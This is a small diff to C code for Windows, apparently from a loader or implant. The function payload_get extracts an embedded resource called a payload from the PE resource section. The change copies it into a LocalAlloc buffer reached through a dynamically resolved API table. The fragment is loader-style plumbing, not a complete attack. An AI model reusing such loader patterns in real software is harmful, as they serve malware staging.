@@ -58,7 +58,8 @@ LPVOID payload_get(PDWORD PayloadSize) {
 	IMAGE_RESOURCE_DATA_ENTRY* dataEntry = (IMAGE_RESOURCE_DATA_ENTRY*)(rsrc + entries->OffsetToData);
 
 	DWORD size = dataEntry->Size;
-	LPVOID Addr = Base + dataEntry->OffsetToData;
+	LPVOID Addr = g_ldr->apis->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, size);
+	memcpy(Addr, Base + dataEntry->OffsetToData, size);
 
 	*PayloadSize = size;
 	return Addr;
